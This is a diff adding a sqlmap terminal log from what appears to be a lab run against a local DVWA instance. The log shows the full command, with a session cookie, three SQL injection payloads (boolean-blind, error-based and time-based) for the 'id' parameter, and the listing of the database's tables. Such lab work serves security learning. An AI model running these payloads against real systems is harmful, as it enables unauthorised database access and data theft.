@@ -1,0 +1,46 @@
+ $ sqlmap --url="http://127.0.0.1:42001/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=tnusaaspju33gd737338bcnhrl; security=low" --data="id=1&Submit=Submit" -p id -D dvwa --tables --batch --threads 5
+         ___
+     __H__
+ ___ ___[']_____ ___ ___  {1.7.12#stable}
+ |_ -| . ["]     | .'| . |
+ |___|_  [.]_|_|_|__,|  _|
+     |_|V...       |_|   https://sqlmap.org
+
+ [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+ [*] starting @ 10:38:55 /2023-12-14/
+
+ [10:38:55] [INFO] resuming back-end DBMS 'mysql'
+ [10:38:55] [INFO] testing connection to the target URL
+ sqlmap resumed the following injection point(s) from stored session:
+ ---
+ Parameter: id (GET)
+     Type: boolean-based blind
+     Title: AND boolean-based blind - WHERE or HAVING clause
+     Payload: id=1' AND 2879=2879 AND 'FGUV'='FGUV&Submit=Submit
+
+     Type: error-based
+     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+     Payload: id=1' AND (SELECT 5082 FROM(SELECT COUNT(*),CONCAT(0x716b627071,(SELECT (ELT(5082=5082,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VSXt'='VSXt&Submit=Submit
+
+     Type: time-based blind
+     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+     Payload: id=1' AND (SELECT 9523 FROM (SELECT(SLEEP(5)))RuBI) AND 'DZYn'='DZYn&Submit=Submit
+ ---
+ [10:38:55] [INFO] the back-end DBMS is MySQL
+ web application technology: Nginx 1.24.0
+ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+ [10:38:55] [INFO] fetching tables for database: 'dvwa'
+ [10:38:55] [INFO] starting 2 threads
+ [10:38:55] [INFO] retrieved: 'users'
+ [10:38:55] [INFO] retrieved: 'guestbook'
+ Database: dvwa
+ [2 tables]
+ +-----------+
+ | guestbook |
+ | users     |
+ +-----------+
+
+ [10:38:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
+
+ [*] ending @ 10:38:55 /2023-12-14/
